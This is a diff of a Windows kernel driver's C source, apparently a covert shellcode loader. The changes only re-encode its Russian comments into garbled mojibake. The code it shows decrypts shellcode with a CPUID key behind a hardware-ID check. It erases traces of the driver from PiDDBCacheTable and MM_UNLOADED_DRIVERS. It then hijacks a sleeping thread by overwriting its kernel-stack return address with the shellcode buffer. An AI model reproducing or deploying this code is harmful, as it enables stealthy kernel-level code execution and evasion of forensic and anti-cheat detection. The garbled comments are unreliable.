@@ -5,13 +5,13 @@
 DRIVER_INITIALIZE DriverEntry;
 #pragma alloc_text(INIT, DriverEntry)
 
-//сюда будет копироваться из fileMapping'a
+//СЃСЋРґР° Р±СѓРґРµС‚ РєРѕРїРёСЂРѕРІР°С‚СЊСЃСЏ РёР· fileMapping'a
 UCHAR shellCodeFromC[2048] = { 0 };
 
-//код-статусы для "синхронизации" событий
-const UCHAR Status_MapSetted_WaitForDriverGetCWay = 0xFF;		//приложение создало FileMap, выделило и заполнело память структурой _UserAppInfo
-const UCHAR Status_DriverGetCWay = 0xAA;						//драйвер получил доступ к CWay, FileMapping можно закрывать
-const UCHAR Status_ShellCodeExecuted = 0xBB;					//шеллкод начал выполняться
+//РєРѕРґ-СЃС‚Р°С‚СѓСЃС‹ РґР»СЏ "СЃРёРЅС…СЂРѕРЅРёР·Р°С†РёРё" СЃРѕР±С‹С‚РёР№
+const UCHAR Status_MapSetted_WaitForDriverGetCWay = 0xFF;		//РїСЂРёР»РѕР¶РµРЅРёРµ СЃРѕР·РґР°Р»Рѕ FileMap, РІС‹РґРµР»РёР»Рѕ Рё Р·Р°РїРѕР»РЅРµР»Рѕ РїР°РјСЏС‚СЊ СЃС‚СЂСѓРєС‚СѓСЂРѕР№ _UserAppInfo
+const UCHAR Status_DriverGetCWay = 0xAA;						//РґСЂР°Р№РІРµСЂ РїРѕР»СѓС‡РёР» РґРѕСЃС‚СѓРї Рє CWay, FileMapping РјРѕР¶РЅРѕ Р·Р°РєСЂС‹РІР°С‚СЊ
+const UCHAR Status_ShellCodeExecuted = 0xBB;					//С€РµР»Р»РєРѕРґ РЅР°С‡Р°Р» РІС‹РїРѕР»РЅСЏС‚СЊСЃСЏ
 
 
 UserAppInfo uAppInfo = { 0, NULL };
@@ -24,7 +24,7 @@ ShellDataAddr shellDataAddr = { 0 };
 //#define NOHWIDCHECK
 
 VOID FillShellData(PEPROCESS curProc) {
-	shellData.CurrentEProcess = curProc;		//для KeStackAttachProcess
+	shellData.CurrentEProcess = curProc;		//РґР»СЏ KeStackAttachProcess
 
 	
 
@@ -43,7 +43,7 @@ VOID FillShellData(PEPROCESS curProc) {
 	}*/
 }
 
-//заполняет таблицу с адресами функций shellDataFunc
+//Р·Р°РїРѕР»РЅСЏРµС‚ С‚Р°Р±Р»РёС†Сѓ СЃ Р°РґСЂРµСЃР°РјРё С„СѓРЅРєС†РёР№ shellDataFunc
 VOID FillshellDataFunc(PVOID CWayBuf) {
 	shellDataAddr.CWay = CWayBuf;
 
@@ -51,7 +51,7 @@ VOID FillshellDataFunc(PVOID CWayBuf) {
 	shellDataAddr.MyMmUserProbeAddress = MmUserProbeAddress;
 	//shellDataAddr.MmMapIoSpace = GetSystemAddr(L"MmMapIoSpace");
 	//shellDataAddr.MmUnmapIoSpace = GetSystemAddr(L"MmUnmapIoSpace");
-	//shellDataAddr.KeDelayExecutionThread = GetSystemAddr(L"KeDelayExecutionThread");//заполняется при поиске потока для захвата
+	//shellDataAddr.KeDelayExecutionThread = GetSystemAddr(L"KeDelayExecutionThread");//Р·Р°РїРѕР»РЅСЏРµС‚СЃСЏ РїСЂРё РїРѕРёСЃРєРµ РїРѕС‚РѕРєР° РґР»СЏ Р·Р°С…РІР°С‚Р°
 
 	 
 	shellDataAddr.PsLookupProcessByProcessId = GetSystemAddr(L"PsLookupProcessByProcessId");
@@ -100,17 +100,17 @@ NTSTATUS GetUserAppInfo(PCWSTR FileMapName) {
 		SIZE_T viewSize = PAGE_SIZE;
 		status = ZwMapViewOfSection(m_SectionHandle, NtCurrentProcess(), &BaseAddr, 0L, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_READWRITE);
 		if (NT_SUCCESS(status)) {
-			memcpy(&uAppInfo, BaseAddr, sizeof(uAppInfo));//получаем данные из FileMap
+			memcpy(&uAppInfo, BaseAddr, sizeof(uAppInfo));//РїРѕР»СѓС‡Р°РµРј РґР°РЅРЅС‹Рµ РёР· FileMap
 
 			PUserAppInfo userAppInfo2 = (PUserAppInfo)BaseAddr;
-			memcpy(shellCodeFromC, &userAppInfo2->ShellBegin, userAppInfo2->shellCodeSize);//читаем шеллкода из filemapping'a и сохраняем локально
+			memcpy(shellCodeFromC, &userAppInfo2->ShellBegin, userAppInfo2->shellCodeSize);//С‡РёС‚Р°РµРј С€РµР»Р»РєРѕРґР° РёР· filemapping'a Рё СЃРѕС…СЂР°РЅСЏРµРј Р»РѕРєР°Р»СЊРЅРѕ
 		 
 			ZwUnmapViewOfSection(NtCurrentProcess(), BaseAddr);
 
 #ifdef NOHWIDCHECK
 
 #else
-			//здесь проверяется хеш полученный и который всегда в драйвере
+			//Р·РґРµСЃСЊ РїСЂРѕРІРµСЂСЏРµС‚СЃСЏ С…РµС€ РїРѕР»СѓС‡РµРЅРЅС‹Р№ Рё РєРѕС‚РѕСЂС‹Р№ РІСЃРµРіРґР° РІ РґСЂР°Р№РІРµСЂРµ
 			cpuid = GetCPUID();
 			UCHAR bufHash[20] = { 0 };
 			//DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "cpuid: %u\n", cpuid);
@@ -119,14 +119,14 @@ NTSTATUS GetUserAppInfo(PCWSTR FileMapName) {
 
 				for (USHORT i = 0; i < sizeof(bufHash); i++) {
 					if ((bufHash[i] - writableCPUID[i]) != 0) {
-						//если хоть один байт неверен вшитому байту хеша CPUID, меняем статус на неверный 
+						//РµСЃР»Рё С…РѕС‚СЊ РѕРґРёРЅ Р±Р°Р№С‚ РЅРµРІРµСЂРµРЅ РІС€РёС‚РѕРјСѓ Р±Р°Р№С‚Сѓ С…РµС€Р° CPUID, РјРµРЅСЏРµРј СЃС‚Р°С‚СѓСЃ РЅР° РЅРµРІРµСЂРЅС‹Р№ 
 						status = STATUS_INTERNAL_DB_ERROR;
 						 
 					}
 				}
 			}
 			else {
-				status = STATUS_PIPE_BROKEN;//SHA1 по какой-то причине не смог получить хеш
+				status = STATUS_PIPE_BROKEN;//SHA1 РїРѕ РєР°РєРѕР№-С‚Рѕ РїСЂРёС‡РёРЅРµ РЅРµ СЃРјРѕРі РїРѕР»СѓС‡РёС‚СЊ С…РµС€
 			}
 
 #endif
@@ -259,7 +259,7 @@ NTSTATUS ClearDDBCache(PDRIVER_OBJECT DriverObject) {
 		PiDDBCacheEntry* pFoundEntry = (PiDDBCacheEntry*)RtlLookupElementGenericTableAvl(PiDDBCacheTable, &lookupEntry);
 		if (pFoundEntry == NULL) {
 			ExReleaseResourceLite(PiDDBLock);
-			return STATUS_SUCCESS;//записи о драйвере нету в дереве. Удалять не нужно
+			return STATUS_SUCCESS;//Р·Р°РїРёСЃРё Рѕ РґСЂР°Р№РІРµСЂРµ РЅРµС‚Сѓ РІ РґРµСЂРµРІРµ. РЈРґР°Р»СЏС‚СЊ РЅРµ РЅСѓР¶РЅРѕ
 		}
 
 		RemoveEntryList(&pFoundEntry->List);
@@ -302,8 +302,8 @@ NTSTATUS DriverEntry(struct _DRIVER_OBJECT *DriverObject, PUNICODE_STRING Regist
 	if (!NT_SUCCESS(status)) {
 		//DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "ClearDDBCache error: %p\n", status);
 		return STATUS_CHILD_MUST_BE_VOLATILE;
-		//выходим без очистки UNLOADED_DRIVERS. 
-		//в таком случае информация о драйвере останется как в DDBCache, так и в UNLOADED_DRIVERS
+		//РІС‹С…РѕРґРёРј Р±РµР· РѕС‡РёСЃС‚РєРё UNLOADED_DRIVERS. 
+		//РІ С‚Р°РєРѕРј СЃР»СѓС‡Р°Рµ РёРЅС„РѕСЂРјР°С†РёСЏ Рѕ РґСЂР°Р№РІРµСЂРµ РѕСЃС‚Р°РЅРµС‚СЃСЏ РєР°Рє РІ DDBCache, С‚Р°Рє Рё РІ UNLOADED_DRIVERS
 	}
 	 
 	PreventStoreInUNLOADED_DRIVERS(DriverObject);
@@ -311,16 +311,16 @@ NTSTATUS DriverEntry(struct _DRIVER_OBJECT *DriverObject, PUNICODE_STRING Regist
 	
 
 	/*
-	1) получить id потока и сослаться на него
-	2) получить StackInit в _KTHREAD
-	3) просканировать StackInit, вычитая адреса(стек растет вверх)
-	4) если нашли адрес возврата: fffff80002dc3a2e nt!NtDelayExecution+0x59, заменяем fffff80002dc3a2e на адрес нашего буфера
-	5) ждем когда поток проснется и прыгнет на наш буфер
+	1) РїРѕР»СѓС‡РёС‚СЊ id РїРѕС‚РѕРєР° Рё СЃРѕСЃР»Р°С‚СЊСЃСЏ РЅР° РЅРµРіРѕ
+	2) РїРѕР»СѓС‡РёС‚СЊ StackInit РІ _KTHREAD
+	3) РїСЂРѕСЃРєР°РЅРёСЂРѕРІР°С‚СЊ StackInit, РІС‹С‡РёС‚Р°СЏ Р°РґСЂРµСЃР°(СЃС‚РµРє СЂР°СЃС‚РµС‚ РІРІРµСЂС…)
+	4) РµСЃР»Рё РЅР°С€Р»Рё Р°РґСЂРµСЃ РІРѕР·РІСЂР°С‚Р°: fffff80002dc3a2e nt!NtDelayExecution+0x59, Р·Р°РјРµРЅСЏРµРј fffff80002dc3a2e РЅР° Р°РґСЂРµСЃ РЅР°С€РµРіРѕ Р±СѓС„РµСЂР°
+	5) Р¶РґРµРј РєРѕРіРґР° РїРѕС‚РѕРє РїСЂРѕСЃРЅРµС‚СЃСЏ Рё РїСЂС‹РіРЅРµС‚ РЅР° РЅР°С€ Р±СѓС„РµСЂ
 
 
-	1) Очистка MM_UNLOADED_DRIVERS
-	2) Очистка Shim Cache Driver
-	3) Реализация коммуникации между shellcode и приложением
+	1) РћС‡РёСЃС‚РєР° MM_UNLOADED_DRIVERS
+	2) РћС‡РёСЃС‚РєР° Shim Cache Driver
+	3) Р РµР°Р»РёР·Р°С†РёСЏ РєРѕРјРјСѓРЅРёРєР°С†РёРё РјРµР¶РґСѓ shellcode Рё РїСЂРёР»РѕР¶РµРЅРёРµРј
 
 
 	*/
@@ -387,16 +387,16 @@ NTSTATUS DriverEntry(struct _DRIVER_OBJECT *DriverObject, PUNICODE_STRING Regist
 	DWORD32 cBytes = 0;
 
 	KAPC_STATE state;
-	PEPROCESS Process = PsGetThreadProcess(eThread);//получаем указатель на процесс через поток
+	PEPROCESS Process = PsGetThreadProcess(eThread);//РїРѕР»СѓС‡Р°РµРј СѓРєР°Р·Р°С‚РµР»СЊ РЅР° РїСЂРѕС†РµСЃСЃ С‡РµСЂРµР· РїРѕС‚РѕРє
 
-	ObDereferenceObject(eThread);//мы больше не используем eThread ниже по коду, уменьшаем кол-во ссылок
+	ObDereferenceObject(eThread);//РјС‹ Р±РѕР»СЊС€Рµ РЅРµ РёСЃРїРѕР»СЊР·СѓРµРј eThread РЅРёР¶Рµ РїРѕ РєРѕРґСѓ, СѓРјРµРЅСЊС€Р°РµРј РєРѕР»-РІРѕ СЃСЃС‹Р»РѕРє
 
 
 	for (UCHAR i = 0; i < 4; i++) {
 		for (USHORT j = 1; j < 120; j++) {
-			curAddr--;//вычитается по 8 байт
+			curAddr--;//РІС‹С‡РёС‚Р°РµС‚СЃСЏ РїРѕ 8 Р±Р°Р№С‚
 
-			if (curAddr <= *StackLimitAddr) {//проверка границ стека
+			if (curAddr <= *StackLimitAddr) {//РїСЂРѕРІРµСЂРєР° РіСЂР°РЅРёС† СЃС‚РµРєР°
 				break;
 			}
 
@@ -404,26 +404,26 @@ NTSTATUS DriverEntry(struct _DRIVER_OBJECT *DriverObject, PUNICODE_STRING Regist
 			//NtDelayExecution:
 			//...
 			//fffff800`02dc6a29 e8ee05d1ff      call    nt!KeDelayExecutionThread (fffff800`02ad701c)
-			//fffff800`02dc6a2e 4883c428        add     rsp,28h ;<<-- стек хранит этот адрес
+			//fffff800`02dc6a2e 4883c428        add     rsp,28h ;<<-- СЃС‚РµРє С…СЂР°РЅРёС‚ СЌС‚РѕС‚ Р°РґСЂРµСЃ
 			//
 
-			if (SafeReadKrnlAddr(*curAddr, &cBytes, 4) && cBytes == 0x28c48348) {		//читаем 4 байта из значения стека | 0x4883c428 add     rsp,28h					//
-				if (SafeReadKrnlAddr((UCHAR*)*curAddr - 4, &cBytes, 4)) {				//e8ee05d1ff      call    nt!KeDelayExecutionThread. -4 получим только байты для прыжка
+			if (SafeReadKrnlAddr(*curAddr, &cBytes, 4) && cBytes == 0x28c48348) {		//С‡РёС‚Р°РµРј 4 Р±Р°Р№С‚Р° РёР· Р·РЅР°С‡РµРЅРёСЏ СЃС‚РµРєР° | 0x4883c428 add     rsp,28h					//
+				if (SafeReadKrnlAddr((UCHAR*)*curAddr - 4, &cBytes, 4)) {				//e8ee05d1ff      call    nt!KeDelayExecutionThread. -4 РїРѕР»СѓС‡РёРј С‚РѕР»СЊРєРѕ Р±Р°Р№С‚С‹ РґР»СЏ РїСЂС‹Р¶РєР°
 
 
-					DWORD64 nextInstr = *curAddr;//адрес следующей инструкции после call ... (В стеке хранится как раз адрес следующей инструкции за call)
-					DWORD64 addressofFunc = nextInstr + cBytes - 0x100000000;//адрес следующей инструкции + 4 байта в обратном порядке - 0x100000000
+					DWORD64 nextInstr = *curAddr;//Р°РґСЂРµСЃ СЃР»РµРґСѓСЋС‰РµР№ РёРЅСЃС‚СЂСѓРєС†РёРё РїРѕСЃР»Рµ call ... (Р’ СЃС‚РµРєРµ С…СЂР°РЅРёС‚СЃСЏ РєР°Рє СЂР°Р· Р°РґСЂРµСЃ СЃР»РµРґСѓСЋС‰РµР№ РёРЅСЃС‚СЂСѓРєС†РёРё Р·Р° call)
+					DWORD64 addressofFunc = nextInstr + cBytes - 0x100000000;//Р°РґСЂРµСЃ СЃР»РµРґСѓСЋС‰РµР№ РёРЅСЃС‚СЂСѓРєС†РёРё + 4 Р±Р°Р№С‚Р° РІ РѕР±СЂР°С‚РЅРѕРј РїРѕСЂСЏРґРєРµ - 0x100000000
 
 					
  
 					shellDataAddr.KeDelayExecutionThread = GetSystemAddr(L"KeDelayExecutionThread");
 
-					if (shellDataAddr.KeDelayExecutionThread == addressofFunc) {		//скорее всего мы нашли NtDelayExecution(не экспортируется ядром)
+					if (shellDataAddr.KeDelayExecutionThread == addressofFunc) {		//СЃРєРѕСЂРµРµ РІСЃРµРіРѕ РјС‹ РЅР°С€Р»Рё NtDelayExecution(РЅРµ СЌРєСЃРїРѕСЂС‚РёСЂСѓРµС‚СЃСЏ СЏРґСЂРѕРј)
 						
 #ifdef DEBUG
 						DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "NtDelayExecution found! AddrInStack: %p ValueInStack: %p\n", curAddr, *curAddr);
 #endif
-						shellDataAddr.HijackedAddrInStack = *curAddr;//запоминаем адрес для возврата
+						shellDataAddr.HijackedAddrInStack = *curAddr;//Р·Р°РїРѕРјРёРЅР°РµРј Р°РґСЂРµСЃ РґР»СЏ РІРѕР·РІСЂР°С‚Р°
 						 
 
 						KeStackAttachProcess(Process, &state);
@@ -434,7 +434,7 @@ NTSTATUS DriverEntry(struct _DRIVER_OBJECT *DriverObject, PUNICODE_STRING Regist
 						DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "CWay: %p uAppInfo.CWay: %p\n", CWay, uAppInfo.CWay);
 #endif
 
-						CWay->Status = Status_DriverGetCWay;//сигнализируем о том, что FileMapping можно закрывать
+						CWay->Status = Status_DriverGetCWay;//СЃРёРіРЅР°Р»РёР·РёСЂСѓРµРј Рѕ С‚РѕРј, С‡С‚Рѕ FileMapping РјРѕР¶РЅРѕ Р·Р°РєСЂС‹РІР°С‚СЊ
 
 						KeUnstackDetachProcess(&state);
 
@@ -459,14 +459,14 @@ NTSTATUS DriverEntry(struct _DRIVER_OBJECT *DriverObject, PUNICODE_STRING Regist
 
  
  
-	//работа с шеллкодом
+	//СЂР°Р±РѕС‚Р° СЃ С€РµР»Р»РєРѕРґРѕРј
 	UCHAR* shellBuffer = (UCHAR*)ExAllocatePool(NonPagedPool, 4096);
 	if (shellBuffer) {
 
 		//decrypt
 		EncDecXOR(shellCodeFromC, uAppInfo.shellCodeSize, cpuid);
 
-		//проверяем расшифрованный шеллкод
+		//РїСЂРѕРІРµСЂСЏРµРј СЂР°СЃС€РёС„СЂРѕРІР°РЅРЅС‹Р№ С€РµР»Р»РєРѕРґ
 		BOOLEAN goodDecrypted = FALSE;
 		for (USHORT i = 0; i < uAppInfo.shellCodeSize; i++) {
 			//$49, $BC, $01, $01, $01,
@@ -497,7 +497,7 @@ NTSTATUS DriverEntry(struct _DRIVER_OBJECT *DriverObject, PUNICODE_STRING Regist
 			DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "shellBuffer: %p\n", shellBuffer);
 			__debugbreak();
 #endif
-			*curAddr = shellBuffer;//заменяем на адрес нашего шелла
+			*curAddr = shellBuffer;//Р·Р°РјРµРЅСЏРµРј РЅР° Р°РґСЂРµСЃ РЅР°С€РµРіРѕ С€РµР»Р»Р°
 		}
 		else {
 			//DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "goodDecrypted false! \n");
